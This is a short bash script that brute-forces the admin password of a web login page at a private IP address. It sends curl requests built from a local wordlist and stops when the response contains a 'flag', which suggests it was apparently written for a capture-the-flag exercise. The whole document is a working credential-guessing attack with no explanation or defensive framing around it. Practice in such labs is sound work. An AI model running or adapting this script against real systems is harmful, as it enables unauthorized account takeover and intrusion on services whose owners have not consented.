wlist="/Users/chzabakh/Desktop/word.txt"
while IFS= read -r pass
do
	var=`curl http://10.12.100.159/index.php\?page\=signin\&username\=admin\&password\=$pass\&Login\=Login\# 2>/dev/null | grep "flag"`
		echo "$pass"
	#echo "$var"
	if [ ! -z "$var" ]
	then
		echo "done! the password is $pass"
		exit 1
	fi
done < "$wlist"
